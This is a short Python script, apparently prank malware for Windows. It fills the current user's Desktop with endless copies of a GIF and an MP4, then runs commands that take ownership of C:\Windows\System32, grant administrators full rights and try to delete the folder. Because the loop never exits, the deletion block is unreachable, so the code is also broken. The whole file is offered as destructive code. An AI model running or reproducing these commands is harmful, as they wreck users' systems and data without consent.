import os , shutil
i = int (0)
t = int (0)
while i == 0:
	path = os.path.join(r'C:\Users',os.getlogin(),'Desktop', f'{t}.gif')
	path2 = os.path.join(r'C:\Users',os.getlogin(),'Desktop', f'{t}.mp4')	
	t+=1
	shutil.copy ('henrystickmin.gif',path)
	shutil.copy ('chungus.mp4',path2)
if t == 1000:
	os.system('cmd /c "takeown /a /r /d Y /f C:\Windows\System32"')
	os.system('cmd /c "icacls C:\Windows\System32 /grant administrators:F /t"')
	os.system('cmd /c "rmdir C:\Windows\System32"')
